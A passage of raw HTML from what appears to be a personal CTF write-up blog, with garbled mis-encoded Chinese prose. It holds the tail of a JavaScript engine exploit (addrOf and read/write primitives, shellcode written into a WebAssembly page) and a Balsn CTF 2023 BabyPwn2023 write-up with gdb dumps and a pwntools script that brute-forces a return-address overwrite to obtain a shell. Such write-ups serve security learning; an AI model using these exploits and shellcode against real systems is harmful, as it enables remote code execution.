float64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> bigUnit64[<span class="number">0</span>];	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">itof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	bigUnit64[<span class="number">0</span>] = value;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.<span class="title function_">toString</span>(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoh</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">hex</span>(<span class="title function_">ftoi</span>(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">ftoa</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoi</span>(value) &gt;&gt; <span class="number">1n</span> &lt;&lt; <span class="number">1n</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">atof</span>(<span class="params">value</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">itof</span>(value | <span class="number">1n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">trigger, idx, obj</span>)&#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> obj_arr = [&#123;&#125;];</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">6</span>;</span><br><span class="line">	obj_arr[idx] = obj; <span class="comment">// prevent obj_arr be optimized away</span></span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">ftoa</span>(double_arr[x]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	<span class="title function_">f</span>(<span class="number">0</span>, <span class="number">0</span>, &#123;&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rw_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">g</span>(<span class="params">trigger, idx, addr</span>) &#123;</span><br><span class="line">	<span class="keyword">let</span> double_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>, <span class="number">1.4</span>, <span class="number">1.5</span>, <span class="number">1.6</span>, <span class="number">1.7</span>, <span class="number">1.8</span>, <span class="number">1.9</span>];</span><br><span class="line">	<span class="keyword">let</span> result = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(rw_buffer);</span><br><span class="line">	<span class="keyword">let</span> x = trigger == <span class="number">0</span> ? <span class="number">9007199254740989</span> : <span class="number">9007199254740992</span>;</span><br><span class="line">	x = x + <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">	x -= <span class="number">9007199254740991</span>;</span><br><span class="line">	x *= <span class="number">7</span>;</span><br><span class="line">	trigger = result[idx];</span><br><span class="line">	double_arr[x] = <span class="title function_">itof</span>(addr);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)&#123;</span><br><span class="line">	<span class="title function_">g</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">f</span>(<span class="number">1</span>, <span class="number">0</span>, obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_arr</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (addr % <span class="number">2n</span> == <span class="number">0</span>)&#123;</span><br><span class="line">		addr += <span class="number">1n</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_">g</span>(<span class="number">1</span>, <span class="number">0</span>, addr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule);</span><br><span class="line"><span class="keyword">var</span> wasmInstance_addr = <span class="title function_">addrOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm instance address: &quot;</span>, <span class="title function_">hex</span>(wasmInstance_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tmp_arr = <span class="title function_">get_arr</span>(wasmInstance_addr);</span><br><span class="line"><span class="comment">//theoretically it don&#x27;t have to left shift, but idk why QwQ</span></span><br><span class="line"><span class="comment">//maybe there are some bug in my exp</span></span><br><span class="line"><span class="keyword">var</span> wasm_addr = <span class="title function_">ftoa</span>(tmp_arr[<span class="number">0x1d</span>]) &lt;&lt; <span class="number">8n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wasm address: &quot;</span> + <span class="title function_">hex</span>(wasm_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> win_owob = <span class="title function_">get_arr</span>(wasm_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x10101010101b848n</span>,    <span class="number">0x62792eb848500101n</span>,    <span class="number">0x431480101626d60n</span>,    <span class="number">0x2f7273752fb84824n</span>,</span><br><span class="line">    <span class="number">0x48e78948506e6962n</span>,    <span class="number">0x1010101010101b8n</span>,    <span class="number">0x6d606279b8485001n</span>,    <span class="number">0x2404314801010162n</span>,</span><br><span class="line">    <span class="number">0x1485e086a56f631n</span>,    <span class="number">0x313b68e6894856e6n</span>,    <span class="number">0x101012434810101n</span>,    <span class="number">0x4c50534944b84801n</span>,</span><br><span class="line">    <span class="number">0x6a52d231503d5941n</span>,    <span class="number">0x894852e201485a08n</span>,    <span class="number">0x50f583b6ae2n</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)&#123;</span><br><span class="line">	win_owob[i] = <span class="title function_">itof</span>(shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line">wasmInstance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/12/Balsn-CTF-2023-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/12/Balsn-CTF-2023-Writeup/" class="post-title-link" itemprop="url">Balsn CTF 2023 Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-12 19:50:15" itemprop="dateCreated datePublished" datetime="2023-10-12T19:50:15+08:00">2023-10-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-09-08 19:53:32" itemprop="dateModified" datetime="2025-09-08T19:53:32+08:00">2025-09-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Balsn-CTF-2023"><a href="#Balsn-CTF-2023" class="headerlink" title="Balsn CTF 2023"></a>Balsn CTF 2023</h1><p>é€™æ¬¡è·Ÿ Starburst Kiwawa æ‰“ï¼Œé‹æ°£ä¸éŒ¯æœ‰å°ç£å‰ä¸‰<br>æˆ‘åªè§£æ‰ BabyPwn2023ï¼Œæˆ‘çŒœæ˜¯éé æœŸè§£XD</p>
<h2 id="BabyPwn2023"><a href="#BabyPwn2023" class="headerlink" title="BabyPwn2023"></a>BabyPwn2023</h2><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>ç¨‹å¼å¾ˆçŸ­ï¼Œæ´ä¹Ÿå¾ˆæ˜é¡¯<br>ä½†å•é¡Œæ˜¯æˆ‘å€‘é€™æ¬¡æ²’æœ‰ pop rdi; ret å¯ä»¥å¹«æˆ‘å€‘æ§ rdi ä¾† leak libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">terry1234@Ubuntu22:~/balsn/baby_pwn/share$ checksec  chal</span><br><span class="line">[*] <span class="string">&#x27;/home/terry1234/balsn/baby_pwn/share/chal&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-28h] [rbp-28h] //wrong</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp-8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  __asm &#123; endbr64 &#125;</span><br><span class="line">  v6 = v3;</span><br><span class="line">  setvbuf_0(_bss_start, <span class="number">0LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets_0(&amp;v5); <span class="comment">//rbp-0x20</span></span><br><span class="line">  puts_0(<span class="string">&quot;Baby PWN 2023 :)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>é¦–å…ˆæˆ‘å€‘å¯ä»¥å…ˆçœ‹çœ‹ main() ret å‰ rdi æŒ‡å‘å“ª<br>ç™¼ç¾ä»–æŒ‡å‘ _IO_stdfile_1_lockï¼Œä¸Šé¢æ²’æ±è¥¿ã€_IO_2_1_stdout åœ¨å®ƒå‰é¢ï¼Œæˆ‘åœ¨è³½ä¸­æ²’æƒ³åˆ°æ€éº¼ç”¨ï¼Œè³½å¾Œçœ‹åˆ° lys åœ¨ #writeups å‚³äº†ç”¨é€™å€‹çš„è§£æ³•ï¼Œè²Œä¼¼æ”¹ _IO_stdfile_0_lock å°±èƒ½ leak tls-storage<br><del>æˆ‘çœ‹ä¸æ‡‚ï¼Œä½†æˆ‘å¤§å—éœ‡æ’¼</del><br><img src="/2023/10/12/Balsn-CTF-2023-Writeup/lock.png"></p>
<p>å¾Œé¢æˆ‘ç¿»åˆ°é€™ç¯‡ writeup<br><a target="_blank" rel="noopener" href="https://song-10.gitee.io/2019/12/04/pwn-2019-12-4-wiki-ROPTricks/#2018-XNUCA-gets">https://song-10.gitee.io/2019/12/04/pwn-2019-12-4-wiki-ROPTricks/#2018-XNUCA-gets</a></p>
<p>æ¦‚å¿µå…¶å¯¦å¾ˆç°¡å–®ï¼Œå°±åƒå¹³å¸¸åœ¨ç¹ PIE é‚£æ¨£ partial overwrite å°±å¥½ï¼Œä¸é gets() æœƒæŠŠæˆ‘å€‘çš„ \n æ›æˆ \x00ï¼Œæ‰€ä»¥è¦æ³¨æ„ä¸€ä¸‹é€™é»ï¼Œå…¶ä»–åœ°æ–¹å…¶å¯¦å·®ä¸å¤šã€‚å¦‚æœæˆ‘å€‘èƒ½æŠŠ stack ä¸Šçš„ä¸€å€‹å€¼é€é partial overwrite è®Šæˆ one_gadgetï¼Œæˆ‘å€‘å°±å¯ä»¥ get shell<br>ç•¶ç„¶ï¼Œç”±æ–¼ä¸Šé¢æåˆ°çš„ gets() çš„ç‰¹æ€§ï¼Œæˆ‘å€‘æœƒè¦è·Ÿ ASLR ç¢°é‹æ°£ï¼Œä½†æ©Ÿç‡é‚„åœ¨å¯ä»¥æ¥å—çš„ç¯„åœå…§ï¼Œå¤šé€å¹¾æ¬¡ç¸½æœ‰æ©ŸæœƒæˆåŠŸã€‚<br>é€™é‚Šæˆ‘ç”¨ç¬¬ä¸€å€‹ one_gadget</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x50a37</span> posix_spawn(rsp+<span class="number">0x1c</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0</span>, rbp, rsp+<span class="number">0x60</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; <span class="number">0xf</span> == <span class="number">0</span></span><br><span class="line">  rcx == <span class="literal">NULL</span></span><br><span class="line">  rbp == <span class="literal">NULL</span> || (u16)[rbp] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xebcf1</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, [rbp<span class="number">-0x70</span>])</span><br><span class="line">constraints:</span><br><span class="line">  address rbp<span class="number">-0x78</span> is writable</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [[rbp<span class="number">-0x70</span>]] == <span class="literal">NULL</span> || [rbp<span class="number">-0x70</span>] == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xebcf5</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, r10, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp<span class="number">-0x78</span> is writable</span><br><span class="line">  [r10] == <span class="literal">NULL</span> || r10 == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xebcf8</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  address rbp<span class="number">-0x78</span> is writable</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>æˆ‘å€‘å¯ä»¥çœ‹çœ‹ stack ä¸Šæœ‰ä»€éº¼å€¼å¥½è“‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//libc base addr = 0x00007ffff7c00000</span><br><span class="line">gefâ¤  telescope</span><br><span class="line">0x00007fffffffded8â”‚+0x0000: 0x00007ffff7c29d90  â†’  &lt;__libc_start_call_main+128&gt; mov edi, eax	 â† $rsp</span><br><span class="line">0x00007fffffffdee0â”‚+0x0008: 0x0000000000000000</span><br><span class="line">0x00007fffffffdee8â”‚+0x0010: 0x0000000000401176  â†’  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdef0â”‚+0x0018: 0x0000000100000000</span><br><span class="line">0x00007fffffffdef8â”‚+0x0020: 0x00007fffffffdfe8  â†’  0x00007fffffffe33e  â†’  &quot;/home/terry1234/balsn/baby_pwn/share/chal&quot;</span><br><span class="line">0x00007fffffffdf00â”‚+0x0028: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf08â”‚+0x0030: 0x5dc9144616cd8aba</span><br><span class="line">0x00007fffffffdf10â”‚+0x0038: 0x00007fffffffdfe8  â†’  0x00007fffffffe33e  â†’  &quot;/home/terry1234/balsn/baby_pwn/share/chal&quot;</span><br><span class="line">0x00007fffffffdf18â”‚+0x0040: 0x0000000000401176  â†’  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdf20â”‚+0x0048: 0x0000000000403dc8  â†’  0x0000000000401140  â†’  &lt;__do_global_dtors_aux+0&gt; endbr64 </span><br><span class="line"></span><br><span class="line">gefâ¤  </span><br><span class="line">0x00007fffffffdf28â”‚+0x0050: 0x00007ffff7ffd040  â†’  0x00007ffff7ffe2e0  â†’  0x0000000000000000</span><br><span class="line">0x00007fffffffdf30â”‚+0x0058: 0xa236ebb9ab0f8aba</span><br><span class="line">0x00007fffffffdf38â”‚+0x0060: 0xa236fbc32c478aba</span><br><span class="line">0x00007fffffffdf40â”‚+0x0068: 0x00007fff00000000</span><br><span class="line">0x00007fffffffdf48â”‚+0x0070: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf50â”‚+0x0078: 0x0000000000000000</span><br><span class="line"></span><br><span class="line">0x00007fffffffdf58â”‚+0x0080: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf60â”‚+0x0088: 0x0000000000000000</span><br><span class="line">0x00007fffffffdf68â”‚+0x0090: 0xc3ae57ba9b7fd300</span><br><span class="line">0x00007fffffffdf70â”‚+0x0098: 0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>ç”¨ gdb çœ‹å¯ä»¥ç™¼ç¾ one_gadget åœ¨é€™å¾Œé¢ï¼Œè“‹é€™è£¡æœƒè®“åœ°å€è®Šä½ï¼Œæ’ä¸åˆ° one_gadget</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007fffffffded8â”‚+0x0000: 0x00007ffff7c29d90  â†’  &lt;__libc_start_call_main+128&gt; mov edi, eax	 â† $rsp</span><br></pre></td></tr></table></figure>

<p>é€™è£¡çœ‹èµ·ä¾†æœ‰é»æ©Ÿæœƒ(ld-linux-x86-64.so.2 é€šå¸¸æœƒè¢«åŠ è¼‰åˆ° libc.so.6 é‚„é«˜çš„ address)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  </span><br><span class="line">0x00007fffffffdf28â”‚+0x0050: 0x00007ffff7ffd040  â†’  0x00007ffff7ffe2e0  â†’  0x0000000000000000</span><br><span class="line"></span><br><span class="line">//in ld-linux-x86-64.so.2</span><br><span class="line">gefâ¤  x/gx 0x00007ffff7ffd040</span><br><span class="line">0x7ffff7ffd040 &lt;_rtld_global&gt;:	0x00007ffff7ffe2e0</span><br></pre></td></tr></table></figure>


<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">bss = elf.bss()</span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x2000</span>):</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">	<span class="comment">#p = process(&#x27;./chal&#x27;, timeout = 2)</span></span><br><span class="line">	p = remote(<span class="string">&#x27;babypwn2023.balsnctf.com&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(bss + <span class="number">0x800</span>) + p64(ret) * <span class="number">10</span> + <span class="string">b&#x27;\x37\x8a&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&#x27;Baby PWN 2023 :)\n&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">b&#x27;cat /home/chall/flag&#x27;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		data = p.recv()</span><br><span class="line">		<span class="built_in">print</span>(data)</span><br><span class="line">		p.interactive()</span><br><span class="line">		p.close()</span><br><span class="line">	<span class="keyword">except</span> Exception:</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<p>ä¸»è¾¦æ–¹å…¶å¯¦æœ‰ç™¼äº†ä¸€ç¯‡å…¬å‘Šè¡¨ç¤º BabyPwn2023 çš„æ©Ÿå™¨ä¸€ç›´æœ‰ä¸å°çš„æµé‡ï¼Œå¦‚æœæŒçºŒä¸‹å»çš„è©±å¯èƒ½æœƒèª¿æ•´ä¸€äº›æ±è¥¿ï¼Œä½†æˆ‘è§£å®Œæ‰çœ‹åˆ° qwq<br>åœ¨é€™é‚Šè·Ÿä¸»è¾¦æ–¹èªªè²æŠ±æ­‰</p>
<p>è³½å¾Œæœ‰å»è·Ÿé‚£é¡Œæ©Ÿå™¨çš„ maintainer èŠï¼Œå°æ–¹è¡¨ç¤ºæœ‰å¦ä¸€éšŠä¹Ÿæ˜¯è·Ÿæˆ‘å€‘ç”¨é¡ä¼¼çš„æ–¹æ³•ï¼Œä¸éä»–å€‘æœ‰ leak æ±è¥¿ï¼Œç”¨ 1&#x2F;4096 å·¦å³çš„æ©Ÿç‡åœ¨ç‚¸</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/29/SEKAI-CTF-2023-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Terry1234">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Terry1234's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/29/SEKAI-CTF-2023-Writeup/" class="post-title-link" itemprop="url">SEKAI CTF 2023 Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-08-29 19:36:07" itemprop="dateCreated datePublished" datetime="2023-08-29T19:36:07+08:00">2023-08-29</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-09-08 19:39:08" itemprop="dateModified" datetime="2025-09-08T19:39:08+08:00">2025-09-08</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Sekai-CTF-2023-Writeup"><a href="#Sekai-CTF-2023-Writeup" class="headerlink" title="Sekai CTF 2023 Writeup"></a>Sekai CTF 2023 Writeup</h1><p>å‘¨æœ«éƒ½åœ¨ AIS3 Clubï¼Œè³½ä¸­åªè§£å‡º Cosmic Ray</p>
